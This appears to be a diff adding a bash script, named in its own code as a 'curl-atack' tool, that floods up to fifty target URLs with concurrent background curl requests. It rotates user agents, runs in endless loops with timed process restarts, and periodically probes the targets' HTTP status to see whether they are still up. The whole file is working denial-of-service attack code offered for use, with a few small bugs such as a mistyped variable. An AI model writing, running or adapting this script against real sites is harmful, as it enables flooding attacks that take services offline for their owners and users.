@@ -1,0 +1,255 @@
+#!/bin/bash
+source ./curl-atack-env.txt
+R=
+C=
+w=
+
+infoer(){
+        (echo $H1 $(nice -n19 curl -L -A "$UA1" -I $H1 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H2 $(nice -n19 curl -L -A "$UA1" -I $H2 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H3 $(nice -n19 curl -L -A "$UA1" -I $H3 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H4 $(nice -n19 curl -L -A "$UA1" -I $H4 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H5 $(nice -n19 curl -L -A "$UA1" -I $H5 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H6 $(nice -n19 curl -L -A "$UA1" -I $H6 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H7 $(nice -n19 curl -L -A "$UA1" -I $H7 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H8 $(nice -n19 curl -L -A "$UA1" -I $H8 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H9 $(nice -n19 curl -L -A "$UA1" -I $H9 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H10 $(nice -n19 curl -L -A "$UA1" -I $H10 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+
+        (echo $H11 $(nice -n19 curl -L -A "$UA2" -I $H11 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H12 $(nice -n19 curl -L -A "$UA2" -I $H12 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H13 $(nice -n19 curl -L -A "$UA2" -I $H13 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H14 $(nice -n19 curl -L -A "$UA2" -I $H14 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H15 $(nice -n19 curl -L -A "$UA2" -I $H15 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H16 $(nice -n19 curl -L -A "$UA2" -I $H16 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H17 $(nice -n19 curl -L -A "$UA2" -I $H17 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H18 $(nice -n19 curl -L -A "$UA2" -I $H18 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H19 $(nice -n19 curl -L -A "$UA2" -I $H19 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H20 $(nice -n19 curl -L -A "$UA2" -I "$20" 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+
+        (echo $H21 $(nice -n19 curl -L -A "$UA3" -I $H21 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H22 $(nice -n19 curl -L -A "$UA3" -I $H22 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H23 $(nice -n19 curl -L -A "$UA3" -I $H23 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H24 $(nice -n19 curl -L -A "$UA3" -I $H24 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H25 $(nice -n19 curl -L -A "$UA3" -I $H25 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H26 $(nice -n19 curl -L -A "$UA3" -I $H26 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H27 $(nice -n19 curl -L -A "$UA3" -I $H27 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H28 $(nice -n19 curl -L -A "$UA3" -I $H28 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H29 $(nice -n19 curl -L -A "$UA3" -I $H29 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H30 $(nice -n19 curl -L -A "$UA3" -I "$H30" 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+
+        (echo $H31 $(nice -n19 curl -L -A "$UA4" -I $H31 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H32 $(nice -n19 curl -L -A "$UA4" -I $H32 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H33 $(nice -n19 curl -L -A "$UA4" -I $H33 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H34 $(nice -n19 curl -L -A "$UA4" -I $H34 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H35 $(nice -n19 curl -L -A "$UA4" -I $H35 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H36 $(nice -n19 curl -L -A "$UA4" -I $H36 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H37 $(nice -n19 curl -L -A "$UA4" -I $H37 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H38 $(nice -n19 curl -L -A "$UA4" -I $H38 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H39 $(nice -n19 curl -L -A "$UA4" -I $H39 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H40 $(nice -n19 curl -L -A "$UA4" -I "$H40" 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+
+        (echo $H41 $(nice -n19 curl -L -A "$UA5" -I $H41 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H42 $(nice -n19 curl -L -A "$UA5" -I $H42 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H43 $(nice -n19 curl -L -A "$UA5" -I $H43 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H44 $(nice -n19 curl -L -A "$UA5" -I $H44 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H45 $(nice -n19 curl -L -A "$UA5" -I $H45 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H46 $(nice -n19 curl -L -A "$UA5" -I $H46 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H47 $(nice -n19 curl -L -A "$UA5" -I $H47 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H48 $(nice -n19 curl -L -A "$UA5" -I $H48 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H49 $(nice -n19 curl -L -A "$UA5" -I $H49 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+        (echo $H50 $(nice -n19 curl -L -A "$UA5" -I "$H50" 2>/dev/null | grep 'HTTP')) &
+        Pp="$!"; (sleep $t4; kill -15 $Pp &>/dev/null) &
+}
+
+runer(){
+        nice -n19 curl -L -A "$UA1" $H1 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA1" $H2 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA1" $H3 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA1" $H4 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA1" $H5 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA1" $H6 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA1" $H7 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA1" $H8 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA1" $H9 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA1" $H10 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+
+        nice -n19 curl -L -A "$UA2" $H11 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA2" $H12 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA2" $H13 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA2" $H14 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA2" $H15 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA2" $H16 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA2" $H17 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA2" $H18 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA2" $H19 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA2" $H20 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+
+        nice -n19 curl -L -A "$UA3" $H21 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA3" $H22 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA3" $H23 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA3" $H24 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA3" $H25 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA3" $H26 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA3" $H27 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA3" $H28 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA3" $H29 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA3" $H30 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+
+        nice -n19 curl -L -A "$UA4" $H31 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA4" $H32 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA4" $H33 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA4" $H34 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA4" $H35 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA4" $H36 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA4" $H37 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA4" $H38 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA4" $H39 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA4" $H40 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+
+        nice -n19 curl -L -A "$UA5" $H41 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA5" $H42 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA5" $H43 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA5" $H44 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA5" $H45 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA5" $H46 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA5" $H47 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA5" $H48 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA5" $H49 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+        nice -n19 curl -L -A "$UA5" $H50 &>/dev/null &
+        PID="$!"; (sleep $t4; kill -15 $PID &>/dev/null) &
+}
+
+trap "echo 'Stoping...'; killall -w -15 curl; pkill -15 curl" 2
+for ((;;)); do
+   w=$(($w+1))
+   for r in $(seq $sq1); do
+      sleep $t2
+      for i in $(seq $sq2); do
+         sleep $t3
+         runer
+      done &
+      R="$R $!"
+      if [[ "$w" -eq "$rcount" ]];then
+         kill -15 $R &>/dev/null
+         R=''
+      fi
+   done &
+   C="$C $!"
+   sleep $t1
+   if [[ "$w" -eq "$rcount" ]];then
+      echo "t1="$t1"s t2="$t2"s t3="$t4"s t4="$t4"s | sq1="$sq1"counts sq2="$sq2"counts"
+      echo "RCount=$w/"$rcount"counts. Killing curl process..."
+      source ./curl-atack-env.txt
+      kill -15 $C &>/dev/null
+      kill -15 $(pgrep -x curl) &>/dev/null
+      for j in $(seq 1); do
+         infoer
+         sleep 5
+      done &
+      C=''
+      w='0'
+      sleep 1
+   fi
+done
+
+pkill curl
+wait
